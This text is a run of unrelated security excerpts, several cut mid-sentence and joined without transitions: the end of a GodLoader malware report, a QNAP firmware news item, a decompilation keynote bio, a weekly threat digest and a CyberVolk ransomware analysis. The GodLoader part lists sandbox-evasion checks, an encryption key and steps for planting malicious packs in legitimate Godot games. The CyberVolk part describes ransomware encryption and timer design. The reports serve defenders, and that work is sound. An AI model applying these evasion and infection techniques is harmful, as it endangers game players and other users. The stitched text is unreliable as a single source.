&lt;li&gt;Godot parameter &lt;code&gt;application/config/name&lt;/code&gt; was changed from &lt;strong&gt;BLACKLAUCNHER&lt;/strong&gt; to &lt;strong&gt;NewLauncher&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The next variant was observed on August 6, 2024, and includes the following changes: &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The actor added a free space check, used as a sandbox analysis evasion technique. The application does not download any payload if the free space on all drives is less than 360GB.&lt;/li&gt;



&lt;li&gt;A TLS certificate was added to the configuration under the Godot options name &lt;code&gt;network/tls/certificate_bundle_override&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The next change was made on August 22, 2024, with the following updates: &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The actor switched to a different Sandbox evasion technique. This time, the script checked the names of available 3D video graphics adapters and continued to operate only if any of the following strings were found in the names: &lt;code&gt;Nvidia&lt;/code&gt;, &lt;code&gt;AMD&lt;/code&gt;, &lt;code&gt;Radeon&lt;/code&gt;, &lt;code&gt;rx&lt;/code&gt;.&lt;/li&gt;



&lt;li&gt;Links to malicious payloads have been updated. New links were unavailable at the time of writing.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The following day, August 23, 2024, new payload links replaced the old ones. &lt;/p&gt;



&lt;p&gt;On August 26, a new variant was spotted on VT. This time, the actor created an additional folder under &lt;code&gt;C:/ProgramData&lt;/code&gt; named &lt;code&gt;Update&lt;/code&gt; to save the downloaded payload.&lt;/p&gt;



&lt;p&gt;The final version we obtained is marked as first seen on September 4, 2024. In this variant, the actor encrypted the resource file with the help of the stock Godot engine. The Godot engine allows developers to encrypt resource files with an &lt;a href="https://docs.godotengine.org/en/stable/contributing/development/compiling/compiling_with_script_encryption_key.html" rel="noreferrer noopener" target="_blank"&gt;AES cipher&lt;/a&gt;. &lt;/p&gt;



&lt;p&gt;The following is the key used for the encryption of &lt;code&gt;.pck&lt;/code&gt; file: &lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;FB 30 66 F5 3A FA 7A B9 AA 44 4C 59 18 6C 75 0E 4E 23 7C 5E 5E FF B5 60 E5 12 34 00 BC 76 72 4D
&lt;/pre&gt;



&lt;h1 class="wp-block-heading"&gt;Potential Attack Scenario(s)&lt;/h1&gt;



&lt;p&gt;At this time, this new technique has been implemented by utilizing Godot Engines executables, which threat actors built. However, there is also the possibility of infecting legit Godot games by either replacing the legit &lt;code&gt;.pck&lt;/code&gt; file with a malicious one or by “infecting” a legit Godot Engine by replacing the &lt;code&gt;pck&lt;/code&gt; section with the malicious one. While we have not seen any current indications of this technique exploited in the wild, the possible scenario resembles &lt;a href="https://research.checkpoint.com/2024/10-years-of-dll-hijacking-and-what-we-can-do-to-prevent-10-more/" rel="noreferrer noopener" target="_blank"&gt;DLL Hijacking&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;This scenario would require the attackers to obtain the AES key used by the legitimate engine executable, which is used to encrypt/decrypt the legitimate &lt;code&gt;.pck&lt;/code&gt; file. As long as the Godot &lt;code&gt;pck&lt;/code&gt; file is encrypted with a &lt;a href="https://research.checkpoint.com/2024/modern-cryptographic-attacks-a-guide-for-the-perplexed/" rel="noreferrer noopener" target="_blank"&gt;symmetric algorithm&lt;/a&gt;, the key can be used for encryption and decryption and obtained by the Godot Engine executable. Threat actors must obtain the AES key, pack and encrypt their pck file with the same key.&lt;/p&gt;



&lt;p&gt;Threat actor steps to exploit legitimate Godot Engine game:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Obtain the Godot game executable.&lt;/li&gt;



&lt;li&gt;Reverse and obtain AES Key.&lt;/li&gt;



&lt;li&gt;Craft a malicious &lt;code&gt;pck&lt;/code&gt; file and encrypt it with the obtained key.&lt;/li&gt;



&lt;li&gt;Trick specific game users to replace the current &lt;code&gt;pck&lt;/code&gt; file with a malicious one.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;If the game executable embeds the contents of the pack file, a similar process is required.  Potentially, an “infector”, could replace the pck section contents with the malicious file. The infector may contain embedded or download from the remote server the malicious pck content and search to find the Godot engine executable and infect it while respecting the PE headers. &lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30784" height="812" src="https://research.checkpoint.com/wp-content/uploads/2024/11/16.png" style="width: 714px; height: auto;" width="931" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 16 &amp;#8211; Potential infection scenarios.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;This attack scenario, which infects legitimate Godot-built games, can be prevented by enforcing pack data encryption and changing the encryption method from a symmetric (AES) algorithm to an asymmetric one. By reversing and grabbing the decryption key, threat actors won’t be able to encrypt their malicious pack file with a valid key since they will need to obtain the private key from the authors.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30860" height="370" src="https://research.checkpoint.com/wp-content/uploads/2024/11/new_gif_blurred.gif" width="1734" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 17 &amp;#8211; Attack Scenario POC.&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Threat actors could attack popular Godot-developed games as game mods or cheats targeting their audience. Based on popular games developed with Godot, this technique could potentially target a massive gaming base of more than 1.2 million players.&lt;/p&gt;



&lt;h1 class="wp-block-heading"&gt;Conclusion&lt;/h1&gt;



&lt;p&gt;In conclusion, the Godot Engine is a legitimate software designed as an open-source game development tool that has been leveraged for malicious purposes due to its flexibility and the relative obscurity in malware development. Threat actors have utilized Godot’s scripting capabilities to create custom loaders that remain undetected by many conventional security solutions. Since Godot’s architecture allows platform-agnostic payload delivery, attackers can easily deploy malicious code across Windows, Linux, and macOS, sometimes even exploring Android options. Additionally, the simplicity of GDScript, combined with Godot’s ability to integrate into various operating systems, enables attackers to bypass traditional detection methods.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;The threat actor behind this attack distributed GodLoader utilizing the Stargazers Ghost Network. This Ghost Network has demonstrated sophistication and success in its campaigns, exploiting trust in open-source and legitimate software repositories to distribute malware discreetly. By masquerading as reputable applications or tools, the network attracts unsuspecting users who download and install what they believe to be safe software. This approach allows the malware to spread widely and rapidly, with thousands of users affected relatively quickly.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Combining a highly targeted distribution method and a discreet, undetected technique has resulted in exceptionally high infection rates. This cross-platform approach enhances malware versatility, giving threat actors a powerful tool that can easily target multiple operating systems. This method allows attackers to deliver malware more effectively across various devices, maximizing their reach and impact.&amp;nbsp;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Mitigations&lt;/h2&gt;



&lt;p&gt;To mitigate the risks of threats like GodLoader, it is essential to keep operating systems and applications updated through timely patches and other means. Individuals should exercise caution when dealing with unexpected emails or messages containing links, particularly from unknown senders. Enhancing cybersecurity awareness among employees is also crucial, as it helps create a more vigilant workforce. Lastly, consulting security specialists for any doubts or uncertainties can provide valuable expertise and guidance in navigating potential security challenges. &lt;/p&gt;

The company has pulled back the firmware and issued a fixed version, but the company's response has left some users feeling less confident in the boxes into which they put all their digital stuff.&lt;/p&gt;
&lt;p&gt;As seen on &lt;a href="https://community.qnap.com/t/firmware-qts-5-2-2-2950-build-20241114-released/254"&gt;a QNAP community thread&lt;/a&gt;, and as &lt;a href="https://www.qnap.com/en-us/news/2024/qnap-addresses-recent-qts-5-2-2-operating-system-update-issues"&gt;announced by QNAP itself&lt;/a&gt;, the QNAP operating system, QTS, received update 5.2.2.2950, build 20241114, at some point around November 19. After QNAP "received feedbacks from some users reporting issues with device functionality after installation," the firm says it withdrew it, "conducted a comprehensive investigation," and re-released a fixed version "within 24 hours."&lt;/p&gt;
&lt;p&gt;The community thread sees many more users of different systems having problems than the shortlist ("limited models of TS-x53D series and TS-x51 series") released by QNAP. Issues reported included owners being rejected as an authorized user, devices reporting issues with booting, and claims of Python not being installed to run some apps and services.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2024/11/qnap-firmware-update-leaves-nas-owners-locked-out-of-their-boxes/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

That summer, she integrated it into a mixed GPM Modula-2 compiler/interpreter for the 8086 processor. This gave her hands-on experience with assembly language and the process of converting intermediate representations into executable code, laying the groundwork for her later research.&lt;/p&gt;
&lt;p&gt;In 1994, she submitted a PhD thesis entitled &lt;i&gt;Reverse Compilation Techniques&lt;/i&gt;. The work involved analyzing 80286 DOS binaries, studying assembly language, mapping groups of instructions into graphs, tracing parameters and data flows, and understanding how compilers optimized code. Her groundbreaking research introduced techniques that, while initially a niche academic endeavor, gained significant traction in the 2000s with the rising focus on application security and need to reverse engineer malware&lt;/p&gt;
&lt;p&gt;In this keynote, Dr Cifuentes reflects on her pioneering PhD work, the evolution of decompilation technology over the past three decades, its adoption in commercial applications, and its role in developing tools for malware analysis.&lt;/p&gt;
&lt;p&gt;Through this retrospective, she connects the foundational research of her early career with its enduring impact on cybersecurity today.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;About the Author&lt;/h2&gt;
&lt;p&gt;Dr Cristina Cifuentes is Vice President of Oracle’s Software Assurance organization. Cristina’s passion for tackling the big issues in the field of Program Analysis began with her doctoral work in binary decompilation at the Queensland University of Technology, which led to her being named the Mother of Decompilation for her contributions to this domain.&lt;/p&gt;
&lt;p&gt;Before she joined Oracle and Sun Microsystems, Cristina held academic posts at major Australian Universities, co-edited Going Digital, a landmark book on Cybersecurity, and served on the executive committees of ACM SIGPLAN and IEEE Reverse Engineering.&lt;/p&gt;

The attacker deleted email messages and accessed certain files, though the specific files remain unidentified.&lt;/li&gt;
&lt;li&gt;A threat actor identified as &amp;#8216;nears&amp;#8217; (previously near2tlg) has &lt;a href="https://www.bleepingcomputer.com/news/security/cyberattack-at-french-hospital-exposes-health-data-of-750-000-patients/"&gt;claimed&lt;/a&gt; responsibility for a cyberattack on a French hospital that resulted in the exposure of sensitive health records for 750K patients. The attacker compromised a MediBoard account using stolen credentials. The leaked data includes full names, home addresses, phone numbers, health card histories, physician details, and prescriptions.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Over 2000 of Palo Alto Networks firewalls have been &lt;a href="https://thehackernews.com/2024/11/warning-over-2000-palo-alto-networks.html"&gt;compromised&lt;/a&gt; in attacks exploiting two recently patched vulnerabilities: an authentication bypass (CVE-2024-0012) and a privilege escalation flaw (CVE-2024-9474) in the PAN-OS management web interface. These vulnerabilities enable attackers to gain administrator privileges and execute commands with root access, leading to malware deployment on affected devices.&lt;/li&gt;
&lt;/ul&gt;

&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point Research has &lt;a href="https://blog.checkpoint.com/research/navigating-the-evolving-threat-landscape-ahead-of-black-friday/"&gt;examined&lt;/a&gt; the activities of cyber criminals exploiting the Black Friday shopping season, identifying a significant increase in malicious websites and consistent phishing emails. The study revealed that approximately 3% of new Black Friday-related websites are malicious, with many impersonating well-known and boutique brands. These fraudulent sites often share similar design elements, indicating possible coordinated operations.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay"&gt;identified&lt;/a&gt; a new cash-out tactic, Ghost Tap, which exploits NFC relay techniques to steal funds from stolen credit cards linked to mobile payment systems like Google Pay and Apple Pay. Cybercriminals use publicly available tools such as NFCGate to relay NFC traffic, enabling them to conduct anonymous transactions at POS terminals in different locations, even across countries.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://www.welivesecurity.com/en/eset-research/unveiling-wolfsbane-gelsemiums-linux-counterpart-to-gelsevirine/"&gt;found&lt;/a&gt; multiple Linux backdoors, notably WolfsBane and FireWood, attributed to the China-aligned Gelsemium APT group. WolfsBane functions as the Linux counterpart to the Windows-based Gelsevirine backdoor. These malware variants are designed for cyberespionage, enabling the theft of sensitive data, maintaining persistent access, and evading detection.&lt;/li&gt;
&lt;li&gt;An ongoing supply chain attack, MUT-8694, &lt;a href="https://securitylabs.datadoghq.com/articles/mut-8964-an-npm-and-pypi-malicious-campaign-targeting-windows-users/"&gt;targets&lt;/a&gt; npm and PyPI repositories using typosquatting. The campaign distributes infostealer malware, including Blank Grabber and Skuld Stealer, primarily affecting Windows users. These malicious packages impersonate legitimate libraries, referencing tools like MuMu Player, and leverage platforms like GitHub and repl.it to host payloads.&lt;/li&gt;

&lt;ul&gt;
&lt;li&gt;CyberVolk/GLORIAMIST is a hacktivist collective originating in India with pro-Russia leanings. Between June and October 2024, CyberVolk claimed responsibility for multiple ransomware attacks.&lt;/li&gt;
&lt;li&gt;The main objective of CyberVolk and related groups is to leverage geopolitical issues to launch and justify attacks on public and government entities, primarily in the service of Russian government interests.&lt;/li&gt;
&lt;li&gt;SentinelLabs has observed a shared codebase used by CyberVolk, AzzaSec and DoubleFace’s ransomware. Additionally, CyberVolk has promoted other ransomware families like HexaLocker and Parano. These groups and the tools they leverage are all closely intertwined.&lt;/li&gt;
&lt;li&gt;These hacktivist groups are extremely dynamic and volatile. In-fighting, threats, and inflated political-posturing are common, leading to fragmentation and the rapid re-shaping of the hacktivist threat landscape.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;CyberVolk is a politically motivated hacktivist collective which launched its own RaaS in June 2024. The group uses both DDoS and ransomware attacks in its efforts to undermine and disrupt the operations of those opposed to Russian interests.&lt;/p&gt;
&lt;p&gt;The group has become an increasingly prominent player within the cybercrime ecosystem, adopting and repurposing existing commodity malware to advance its causes. Highly-skilled actors within the collective expand and revise such tools, effectively making them more sophisticated as they move through various hands.&lt;/p&gt;
&lt;p&gt;The CyberVolk collective is a prime example of how readily threat actors can access and deploy dangerous ransomware builders such as AzzaSec, Diamond, LockBit, Chaos and others. This adaptability makes the group highly dynamic and increasingly challenging to track.&lt;/p&gt;
&lt;p&gt;In this post, we provide an overview of a number of ransomware families within the context of CyberVolk’s operations, breaking down the increasingly blurred lines between tools and group affiliations. Understanding the shifting nature of dynamic hacktivist collectives like CyberVolk can help organizations prepare and fortify their defenses.&lt;/p&gt;
&lt;h2&gt;The Origins of CyberVolk Ransomware&lt;/h2&gt;
&lt;p&gt;CyberVolk is a &lt;a href="https://threatmon.io/blog/cybervolk-ransomware-technical-malware-analysis/" rel="noopener noreferrer" target="_blank"&gt;pro-India/pro-Russia&lt;/a&gt; “hacktivist” group that has been actively targeting entities in multiple countries. In its current form, it emerged during May 2024. Prior to this, the group was known by a few different names, including GLORIAMIST, GLORIAMIST India and Solntsevskaya Bratva. CyberVolk exploits current geopolitical issues, focused on launching and justifying its attacks on public and government entities.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter size-full wp-image-109360" height="302" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_1-1.jpg" width="540" /&gt;&lt;/p&gt;
&lt;p&gt;While the group claims alliances with other broad groups such as &lt;a href="https://www.sentinelone.com/blog/lapsus-data-breach/" rel="noopener noreferrer" target="_blank"&gt;LAPSUS$&lt;/a&gt;, &lt;a href="https://www.sentinelone.com/labs/hacktivism-and-state-sponsored-knock-offs-attributing-deceptive-hack-and-leak-operations/" rel="noopener noreferrer" target="_blank"&gt;Anonymous&lt;/a&gt;, and the &lt;a href="https://threatmon.io/blog/digital-war-in-the-middle-east-cyber-threats-in-israel-iran-conflict/" rel="noopener noreferrer" target="_blank"&gt;Moroccan&lt;/a&gt; &lt;a href="https://threatmon.io/blog/digital-war-in-the-middle-east-cyber-threats-in-israel-iran-conflict/" rel="noopener noreferrer" target="_blank"&gt;Dragons&lt;/a&gt;, it has also been associated with &lt;a href="https://www.sentinelone.com/labs/noname05716-the-pro-russian-hacktivist-group-targeting-nato/" rel="noopener noreferrer" target="_blank"&gt;NONAME057(16)&lt;/a&gt; and other RU-friendly, DDoS-focused, groups. However, CyberVolk has also &lt;a href="https://www.rapid7.com/blog/post/2024/10/03/ransomware-groups-demystified-cybervolk-ransomware/" rel="noopener noreferrer" target="_blank"&gt;embraced ransomware&lt;/a&gt; as a tool to further its cause, with self-branded ransomware payloads as well as alliances with associated ransomware families, namely Doubleface, HexaLocker, and the Parano family.&lt;/p&gt;
&lt;p&gt;CyberVolk’s branded ransomware is derived from the AzzaSec (&lt;i&gt;aka&lt;/i&gt; AzzaSecurity) ransomware code. &lt;a href="https://threatmon.io/blog/darkwebs-new-favorite-azzasec-ransomware/" rel="noopener noreferrer" target="_blank"&gt;AzzaSec&lt;/a&gt; is a pro-Russia, anti-Israel, and anti-Ukraine hacktivist group that emerged in February of 2024. It has claimed alliances with some of the same groups linked to CyberVolk such as &lt;a href="https://www.sentinelone.com/labs/noname05716-the-pro-russian-hacktivist-group-targeting-nato/" rel="noopener noreferrer" target="_blank"&gt;NONAME057(16)&lt;/a&gt;. Initially conducting DDoS and defacement attacks, the group later expanded into extortion and ransomware.&lt;/p&gt;

&lt;p&gt;In June, the source-code for “AzzaSec Ransom” was leaked and subsequently adopted and adapted by multiple groups aligned with AzzaSec’s mission. Prior to its disbandment in August of 2024, AzzaSec operated under a ransomware-as-a-service (RaaS) model and pushed out multiple iterations of its Windows-centric ransomware.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109308" style="width: 499px;"&gt;&lt;img alt="AzzaSec “disbandment” announcement, August 2024" class="size-full wp-image-109308" height="731" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_42.jpg" width="499" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109308"&gt;AzzaSec “disbandment” announcement, August 2024&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Post-AzzaSec | The Rise of CyberVolk’s RaaS Operations&lt;/h2&gt;
&lt;p&gt;The CyberVolk-branded RaaS was announced in late June 2024.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109347" style="width: 755px;"&gt;&lt;img alt="CyberVolk Ransomware Announcement, June 2024" class="size-full wp-image-109347" height="385" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_20.jpg" width="755" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109347"&gt;CyberVolk Ransomware Announcement, June 2024&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The CyberVolk-modified ransomware’s development is credited to&lt;code&gt; @ghostdoor_maldev&lt;/code&gt; and is based on the earlier AzzaSec Ransomware code. The Windows-specific payloads are written in C++. Upon execution, the payloads drop bitmap images (files with extension &lt;code&gt;.bmp&lt;/code&gt;) into &lt;code&gt;%temp%&lt;/code&gt; folder, and display them, prior to any encryption occurring. The ransomware will terminate any running processes belonging to either Microsoft Management Console (MMC) or Task Manager.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109302" style="width: 568px;"&gt;&lt;img alt="CyberVolk Ransomware MMC processes and Task Manager Termination" class="size-full wp-image-109302" height="206" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_8.jpg" width="568" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109302"&gt;CyberVolk Ransomware MMC processes and Task Manager Termination&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Early versions of CyberVolk Ransomware used the AES algorithm for file encryption and the SHA512 algorithm for key generation. This was later updated to “ChaCha20-Poly1305 + AES + RSA + Quantum resistant algorithms” according to posts on the group&amp;#8217;s Telegram.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109326" style="width: 1661px;"&gt;&lt;img alt="CyberVolk wallpaper with countdown timer" class="size-full wp-image-109326" height="876" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_26.jpg" width="1661" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109326"&gt;CyberVolk wallpaper with countdown timer&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The payment screen used by CyberVolk Ransomware displays the decryption timer along with payment details. CyberVolk ransomware supports BTC and USDT payments. Across all the functional samples we analyzed, the timeout value was set to 5 hours, with the ransom amount set to $1000.00 (equivalent in BTC or USDT). A ransom note named &lt;code&gt;CyberVolk_Readme.txt&lt;/code&gt; containing the same contact details presented in the wallpaper and payment screens is also dropped to disk. Telegram contact details are provided as well.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109348" style="width: 746px;"&gt;&lt;img alt="CyberVolk ransom note" class="size-full wp-image-109348" height="224" src="https://www.sentinelone.com/wp-content/uploads/2024/11/cybervolk28.jpg" width="746" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109348"&gt;CyberVolk ransom note&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The &lt;code&gt;.CyberVolk&lt;/code&gt; extension is added to affected files:&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109350" style="width: 621px;"&gt;&lt;img alt="CyberVolk-encrypted files" class="size-full wp-image-109350" height="430" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_23.jpg" width="621" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109350"&gt;CyberVolk-encrypted files&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The decryption timer is controlled via a &lt;code&gt;time.dat&lt;/code&gt; file written to &lt;code&gt;%appdata%\Roaming&lt;/code&gt; directory. The timeout is set to 5 hours in CyberVolk samples analyzed by SentinelOne. This functionality is mirrored in the Invisible Ransom payloads as well, as they are based on the same codebase (AzzaSec Ransom).&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109328" style="width: 708px;"&gt;&lt;img alt="Decryption timer in CyberVolk" class="size-full wp-image-109328" height="233" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_24.jpg" width="708" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109328"&gt;Decryption timer in CyberVolk&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The &lt;code&gt;time.dat&lt;/code&gt; file stores the defined timeout value in seconds. Default builds of Invisible Ransom (or CyberVolk) will write &lt;code&gt;time.dat&lt;/code&gt; with a value of &lt;strong&gt;17967&lt;/strong&gt; seconds (roughly 5 hours).&lt;/p&gt;
&lt;p&gt;CyberVolk has continued to utilize their branded ransomware payloads, more recently in attacks against entities in Japan, and hype up these attacks across their various channels (e.g., Telegram, X, Discord). These campaigns were part of “#OpJP” which extended through October. Victims of “#OpJP” include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Japan Foundation&lt;/li&gt;
&lt;li&gt;Japan Oceanographic Data Center (JODC)&lt;/li&gt;
&lt;li&gt;The Japan Meteorological Agency (JMA)&lt;/li&gt;
&lt;li&gt;Tokyo Global Information System Centre&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109351" style="width: 523px;"&gt;&lt;img alt="CyberVolk and #OpJP (Targeting Japan)" class="size-full wp-image-109351" height="445" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_43.jpg" width="523" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109351"&gt;CyberVolk and #OpJP (Targeting Japan)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;CyberVolk Associates | Invisible/Doubleface Team Ransomware&lt;/h2&gt;
&lt;p&gt;Invisible or Doubleface ransomware is associated with “Doubleface Team” (&lt;i&gt;aka&lt;/i&gt; Double Alliance). This group emerged in August-September 2024 as a convergence of associates within CyberVolk, Doubleface, and Moroccan Black Cyber Army. CyberVolk began promoting Doubleface on September 22, 2024.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109342" style="width: 493px;"&gt;&lt;img alt="September 22 DoubleAlliance / CyberVolk posting" class="size-full wp-image-109342" height="404" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_11.jpg" width="493" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109342"&gt;September 22 DoubleAlliance / CyberVolk posting&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Invisible/Doubleface ransomware payloads function in an identical manner to CyberVolk-branded ransomware samples. This includes duplication of the 5-hour timeout setting and active wallpaper modification used for input of the decryption key and displaying payment details. Both ransomware families are derived from the same AzzaSec Ransomware code base.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109311" style="width: 1065px;"&gt;&lt;img alt="Invisible/Doubleface ransomware wallpaper" class="size-full wp-image-109311" height="545" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_4.jpg" width="1065" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109311"&gt;Invisible/Doubleface ransomware wallpaper&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h3&gt;Invisible/Doubleface Source&lt;/h3&gt;
&lt;p&gt;The source code/builder for Invisible has been leaked publicly and distributed through various channels, mainly Telegram. As stated previously, both Invisible and CyberVolk’s payloads as of this writing are based on the same code, observed in AzzaSec Ransomware.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109336" style="width: 972px;"&gt;&lt;img alt="Invisible Ransom source files" class="size-full wp-image-109336" height="350" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_17.jpg" width="972" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109336"&gt;Invisible Ransom source files&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The archive contains the full Visual Studio project and source code for building new Invisible Ransom payloads, along with some already compiled samples/stubs.&lt;/p&gt;
&lt;p&gt;The file &lt;code&gt;ransom.cpp&lt;/code&gt; contains the main logic for the ransomware payload. It contains all the global variables including ransomware note template data, orchestrates all the encryption tasks, and handles any process termination or manipulation. The main &lt;code&gt;ransom.cpp&lt;/code&gt; handles calls out to &lt;code&gt;Cryptographic.cpp&lt;/code&gt; to process encryption tasks, including the implementation of AES/RSA (via &lt;code&gt;aes.cpp&lt;/code&gt; and &lt;code&gt;rsa.cpp&lt;/code&gt; respectively).&lt;/p&gt;
&lt;p&gt;Similar to earlier AzzaSec ransomware examples, these payloads encrypt files via AES, then manage encryption keys and wrapping via RSA. The current implementation indicates AES-256 for file encryption, and RSA-2048 for wrapping the keys. Each file is encrypted via AES-256 (EncFile function in &lt;code&gt;Cryptographic.cpp&lt;/code&gt;) with the AES key then encrypted via RSA-2048.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109313" style="width: 1398px;"&gt;&lt;img alt="Encrypting files in Invisible Ransom" class="size-full wp-image-109313" height="916" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_38.jpg" width="1398" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109313"&gt;Encrypting files in Invisible Ransom&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;We can also see the implementation of the ransom countdown mechanism in &lt;code&gt;ransom.cpp&lt;/code&gt;. As with CyberVolk Ransom, the default timeout period is 5 hours. This is initially set via the &lt;code&gt;timeLeft&lt;/code&gt; variable in &lt;code&gt;ransom.cpp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The timer writes a &lt;code&gt;time.dat&lt;/code&gt; file to &lt;code&gt;%appdata%\Roaming&lt;/code&gt; as we saw with CyberVolk. The 5 hour time limit for these samples is read from this path. In theory, this file could be manipulated to alter the timeout.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109331" style="width: 741px;"&gt;&lt;img alt="Timer code in Invisible Ransom, referencing time.dat" class="size-full wp-image-109331" height="361" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_21.jpg" width="741" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109331"&gt;Timer code in Invisible Ransom, referencing time.dat&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The &lt;code&gt;ransom.cpp&lt;/code&gt; source file also contains the template for the ransom notes, which are written to the same path from which the ransomware is executed as &lt;code&gt;InvisibleReadMe.txt&lt;/code&gt;.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109387" style="width: 744px;"&gt;&lt;img alt="Invisible Ransom ransom note template in “ransom.cpp”" class="size-full wp-image-109387" height="95" src="https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_7cut.jpg" width="744" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109387"&gt;Invisible Ransom&amp;#8217;s ransom note template in “ransom.cpp”&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The termination of MMC processes and Task Manager is also present in the Invisible Ransom source (as we also see with CyberVolk samples)&lt;/p&gt;
&lt;h2&gt;“Lock. Demand. Dominate” | HexaLocker Ransomware&lt;/h2&gt;
